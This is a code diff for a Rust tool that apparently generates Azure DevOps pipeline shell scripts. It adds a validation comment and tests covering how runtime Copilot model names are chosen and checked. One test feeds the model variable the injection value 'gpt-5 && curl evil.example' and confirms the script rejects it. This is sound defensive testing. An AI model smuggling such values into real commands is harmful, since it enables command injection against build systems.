@@ -75,6 +75,7 @@ ado_aw_runtime_model() {
       continue
     fi
     case "$candidate" in
+      # Keep this character set in sync with engine::validate_model_name and runtime_model_preamble.
       *[!A-Za-z0-9._:-]*)
         echo "ERROR: runtime Copilot model from $specific_var/ADO_AW_DEFAULT_MODEL_COPILOT contains invalid characters. Only ASCII alphanumerics, ., _, :, and - are allowed." >&2
         exit 1
@@ -543,8 +544,10 @@ fn bash_single_quote_escape(s: &str) -> String {
 mod tests {
     use super::*;
     use crate::compile::extensions::CompileContext;
+    use crate::compile::shell::ShellScript;
     use crate::compile::types::FrontMatter;
     use std::path::Path;
+    use std::process::{Command, Output};
 
     fn parse_fm(yaml: &str) -> FrontMatter {
         serde_yaml::from_str(yaml).expect("front matter parses")
@@ -562,6 +565,26 @@ mod tests {
             Step::Bash(b) => b,
             other => panic!("expected Step::Bash, got {other:?}"),
         }
+    }
+
+    fn run_aw_info_script(envs: &[(&str, &str)], aw_info_json: &str) -> (Output, tempfile::TempDir) {
+        let temp = tempfile::tempdir().expect("temp dir");
+        let script = ShellScript::new(&EMIT_AW_INFO)
+            .bind_text("AGENT_TEMP", temp.path().display().to_string())
+            .fragment("aw_info_json", aw_info_json.to_string())
+            .render();
+        let mut command = Command::new("bash");
+        command.arg("-c").arg(script).env_clear();
+        for (key, value) in envs {
+            command.env(key, value);
+        }
+        (command.output().expect("bash should run"), temp)
+    }
+
+    fn read_aw_info_json(temp: &tempfile::TempDir) -> serde_json::Value {
+        let path = temp.path().join("staging/aw_info.json");
+        let contents = std::fs::read_to_string(path).expect("aw_info.json should be written");
+        serde_json::from_str(&contents).expect("aw_info.json should parse")
     }
 
     #[test]
@@ -722,6 +745,60 @@ mod tests {
             step.env
                 .contains_key(crate::engine::ADO_AW_DEFAULT_MODEL_COPILOT)
         );
+    }
+
+    #[test]
+    fn aw_info_runtime_models_prefer_role_specific_over_default() {
+        let (output, temp) = run_aw_info_script(
+            &[
+                (crate::engine::ADO_AW_MODEL_AGENT_COPILOT, "agent-model"),
+                (
+                    crate::engine::ADO_AW_MODEL_DETECTION_COPILOT,
+                    "detector-model",
+                ),
+                (crate::engine::ADO_AW_DEFAULT_MODEL_COPILOT, "default-model"),
+            ],
+            r#"{"schema":"ado-aw/aw_info/1"}"#,
+        );
+
+        assert!(output.status.success(), "{output:?}");
+        let value = read_aw_info_json(&temp);
+        assert_eq!(value["model"], "agent-model");
+        assert_eq!(value["detection_model"], "detector-model");
+    }
+
+    #[test]
+    fn aw_info_runtime_models_use_default_when_specific_missing_or_unexpanded() {
+        let (output, temp) = run_aw_info_script(
+            &[
+                (
+                    crate::engine::ADO_AW_MODEL_AGENT_COPILOT,
+                    "$(ADO_AW_MODEL_AGENT_COPILOT)",
+                ),
+                (crate::engine::ADO_AW_DEFAULT_MODEL_COPILOT, "default-model"),
+            ],
+            r#"{"schema":"ado-aw/aw_info/1"}"#,
+        );
+
+        assert!(output.status.success(), "{output:?}");
+        let value = read_aw_info_json(&temp);
+        assert_eq!(value["model"], "default-model");
+        assert_eq!(value["detection_model"], "default-model");
+    }
+
+    #[test]
+    fn aw_info_runtime_model_rejects_invalid_value() {
+        let (output, _temp) = run_aw_info_script(
+            &[(
+                crate::engine::ADO_AW_MODEL_AGENT_COPILOT,
+                "gpt-5 && curl evil.example",
+            )],
+            r#"{"schema":"ado-aw/aw_info/1"}"#,
+        );
+
+        assert!(!output.status.success(), "{output:?}");
+        let stderr = String::from_utf8(output.stderr).unwrap();
+        assert!(stderr.contains("invalid characters"), "{stderr}");
     }
 
     #[test]
